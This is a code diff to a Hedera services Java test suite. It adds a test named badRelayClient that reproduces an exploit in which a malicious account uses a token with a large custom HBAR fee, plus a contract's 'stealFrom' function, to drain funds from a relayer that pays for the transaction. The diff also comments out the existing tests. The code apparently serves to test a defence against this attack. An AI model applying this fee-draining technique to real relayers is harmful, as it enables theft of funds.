@@ -29,24 +29,32 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 import java.util.List;
+import java.util.concurrent.atomic.AtomicReference;
 
 import static com.hedera.services.bdd.spec.HapiApiSpec.defaultHapiSpec;
+import static com.hedera.services.bdd.spec.HapiPropertySource.asAccountString;
+import static com.hedera.services.bdd.spec.HapiPropertySource.asHexedSolidityAddress;
+import static com.hedera.services.bdd.spec.HapiPropertySource.asToken;
 import static com.hedera.services.bdd.spec.assertions.AssertUtils.inOrder;
 import static com.hedera.services.bdd.spec.assertions.ContractFnResultAsserts.resultWith;
 import static com.hedera.services.bdd.spec.assertions.TransactionRecordAsserts.recordWith;
 import static com.hedera.services.bdd.spec.keys.KeyFactory.KeyType.THRESHOLD;
+import static com.hedera.services.bdd.spec.queries.QueryVerbs.getAccountBalance;
 import static com.hedera.services.bdd.spec.queries.QueryVerbs.getTxnRecord;
 import static com.hedera.services.bdd.spec.transactions.TxnVerbs.contractCreate;
 import static com.hedera.services.bdd.spec.transactions.TxnVerbs.cryptoCreate;
 import static com.hedera.services.bdd.spec.transactions.TxnVerbs.cryptoTransfer;
 import static com.hedera.services.bdd.spec.transactions.TxnVerbs.ethereumCall;
 import static com.hedera.services.bdd.spec.transactions.TxnVerbs.ethereumContractCreate;
+import static com.hedera.services.bdd.spec.transactions.TxnVerbs.tokenCreate;
 import static com.hedera.services.bdd.spec.transactions.TxnVerbs.uploadInitCode;
 import static com.hedera.services.bdd.spec.transactions.TxnVerbs.uploadInitCodeWithConstructorArguments;
 import static com.hedera.services.bdd.spec.transactions.contract.HapiEthereumCall.ETH_HASH_KEY;
 import static com.hedera.services.bdd.spec.transactions.crypto.HapiCryptoTransfer.tinyBarsFromAccountToAlias;
+import static com.hedera.services.bdd.spec.transactions.token.CustomFeeSpecs.fixedHbarFee;
 import static com.hedera.services.bdd.spec.utilops.CustomSpecAssert.allRunFor;
 import static com.hedera.services.bdd.spec.utilops.UtilVerbs.newKeyNamed;
+import static com.hedera.services.bdd.spec.utilops.UtilVerbs.sourcing;
 import static com.hedera.services.bdd.spec.utilops.UtilVerbs.withOpContext;
 import static com.hedera.services.bdd.suites.contract.Utils.FunctionType.CONSTRUCTOR;
 import static com.hedera.services.bdd.suites.contract.Utils.getABIFor;
@@ -75,17 +83,76 @@ public class HelloWorldEthereumSuite extends HapiApiSuite {
     }
 
     List<HapiApiSpec> ethereumCalls() {
-        return List.of(
-                depositSuccess()
-        );
+        return List.of(new HapiApiSpec[] {
+//                depositSuccess(),
+                badRelayClient(),
+        });
     }
 
     List<HapiApiSpec> ethereumCreates() {
-        return List.of(
-                smallContractCreate(),
-                contractCreateWithConstructorArgs(),
-                bigContractCreate()
-        );
+        return List.of(new HapiApiSpec[] {
+//                smallContractCreate(),
+//                contractCreateWithConstructorArgs(),
+//                bigContractCreate()
+        });
+    }
+
+    HapiApiSpec badRelayClient() {
+        final var adminKey = "adminKey";
+        final var exploitToken = "exploitToken";
+        final var exploitContract = "BadRelayClient";
+        final var maliciousTxn = "theft";
+        final var maliciousEOA = "maliciousEOA";
+        final var maliciousAutoCreation = "maliciousAutoCreation";
+        final var maliciousStartBalance = ONE_HUNDRED_HBARS;
+        final AtomicReference<String> maliciousEOAId = new AtomicReference<>();
+        final AtomicReference<String> relayerEvmAddress = new AtomicReference<>();
+        final AtomicReference<String> exploitTokenEvmAddress = new AtomicReference<>();
+
+        return defaultHapiSpec("badRelayClient")
+                .given(
+                        newKeyNamed(adminKey),
+                        newKeyNamed(maliciousEOA).shape(SECP_256K1_SHAPE),
+                        cryptoCreate(RELAYER)
+                                .balance(10 * ONE_MILLION_HBARS)
+                                .exposingCreatedIdTo(id ->
+                                        relayerEvmAddress.set(
+                                                asHexedSolidityAddress(0, 0, id.getAccountNum()))),
+                        cryptoTransfer(tinyBarsFromAccountToAlias(GENESIS, maliciousEOA, maliciousStartBalance))
+                                .via(maliciousAutoCreation),
+                        withOpContext((spec, opLog) -> {
+                            final var lookup = getTxnRecord(maliciousAutoCreation)
+                                    .andAllChildRecords().logged();
+                            allRunFor(spec, lookup);
+                            final var childCreation = lookup.getChildRecord(0);
+                            maliciousEOAId.set(asAccountString(childCreation.getReceipt().getAccountID()));
+                        }),
+                        uploadInitCode(exploitContract),
+                        contractCreate(exploitContract).adminKey(adminKey),
+                        sourcing(() -> tokenCreate(exploitToken)
+                                .treasury(maliciousEOAId.get())
+                                .symbol("IDYM")
+                                .symbol("I DRINK YOUR MILKSHAKE")
+                                .initialSupply(Long.MAX_VALUE)
+                                .decimals(0)
+                                .withCustom(fixedHbarFee(ONE_MILLION_HBARS, maliciousEOAId.get()))
+                                .signedBy(DEFAULT_PAYER, maliciousEOA)
+                                .exposingCreatedIdTo(id ->
+                                        exploitTokenEvmAddress.set(
+                                                asHexedSolidityAddress(0, 0, asToken(id).getTokenNum()))))
+                ).when(
+                        sourcing(() -> ethereumCall(exploitContract,
+                                "stealFrom", relayerEvmAddress.get(), exploitTokenEvmAddress.get())
+                                .type(EthTxData.EthTransactionType.EIP1559)
+                                .signingWith(maliciousEOA)
+                                .payingWith(RELAYER)
+                                .via(maliciousTxn)
+                                .nonce(0)
+                                .gasLimit(4_000_000L))
+                ).then(
+                        getTxnRecord(maliciousTxn).andAllChildRecords().logged(),
+                        sourcing(() -> getAccountBalance(maliciousEOAId.get()).logged())
+                );
     }
 
     HapiApiSpec depositSuccess() {
